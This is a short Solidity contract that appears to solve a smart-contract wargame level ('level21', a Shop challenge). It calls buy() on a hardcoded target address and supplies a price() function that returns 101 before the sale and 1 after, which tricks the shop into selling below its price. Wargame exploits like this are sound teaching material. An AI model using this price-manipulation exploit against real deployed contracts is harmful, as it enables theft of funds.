// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel21.sol";

contract BrokenShop {

    Shop level21 = Shop(0x9350Bd45e706BCE78Ff84C9eB91503018fFd86F3);

    function exploit() external {
        level21.buy();
    }
    
    function price () external view returns (uint) {
        return level21.isSold() ? 1 : 101;
    }
}